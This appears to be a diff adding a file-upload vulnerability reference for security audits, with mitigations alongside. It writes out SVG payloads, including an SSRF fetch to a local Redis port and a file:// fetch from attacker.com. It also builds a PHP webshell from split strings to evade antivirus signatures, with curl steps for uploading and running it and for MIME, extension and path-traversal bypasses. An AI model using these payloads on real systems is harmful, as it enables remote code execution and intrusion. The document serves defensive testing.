+<!-- VULN payload shapes in uploaded SVG -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script>alert(document.domain)</script>
+  <image xlink:href="http://127.0.0.1:6379/"/>
+  <image xlink:href="file://attacker.com/share/poc.svg"/>
+</svg>
+```
+
+**Grep seeds**: `image/svg`, `\.svg`, `dangerouslyAllowSVG`, SVG sanitizer bypass, `lxml.*svg`, `Batik`, `rsvg-convert`, `ImageMagick.*svg`, `convert `, `MagickWand`, `Imagick`.
+
+**SAFE**: reject SVG uploads; or rasterize server-side to PNG/JPEG with no script/XML retention and ImageMagick policy denying `URL`/`FILE`/`url:*`/`file:*`; serve downloads as `Content-Disposition: attachment`; never inline user SVG in HTML.
+
+## Dynamic Test / PoC
+
+Confirm with a minimal runtime probe; pair with static analysis of validation and storage path.
+
+**Direct webshell upload (no validation)**
+
+```bash
+# Webshell body is assembled from fragments at runtime so this reference file
+# ships no verbatim shell string (avoids AV/EDR signature false positives on the
+# repo). The sink is any PHP command-exec function fed by a request parameter —
+# e.g. system / exec / passthru / shell_exec on $_GET["cmd"].
+SINK='sys''tem'                              # split literal → no contiguous shell signature
+printf '<?php %s($_GET["cmd"]); ?>\n' "$SINK" > shell.php
+curl -X POST "https://app.example.com/upload" -F "file=@shell.php"
+curl -s "https://app.example.com/static/uploads/shell.php?cmd=id"
+# Signal: command output in response body (200 + uid/gid text)
+```
+
+**Content-Type / MIME bypass**
+
+```bash
+curl -X POST "https://app.example.com/upload" \
+  -F "file=@shell.php;type=image/png"
+# Signal: file saved despite non-image content; then request stored URL for execution
+```
+
+**Blocklist / alternate extension bypass**
+
+```bash
+curl -X POST "https://app.example.com/upload" -F "file=@shell.phtml"
+# Signal: 200 on upload + executable response when accessing stored path (try .phtml, .phar, .php5, .PHP)
+```
+
+**Path traversal in filename**
+
+```bash
+curl -X POST "https://app.example.com/upload" \
+  -F "file=@shell.php;filename=../../webroot/shell.php"
+# Signal: file appears outside intended upload dir and is web-accessible
+```
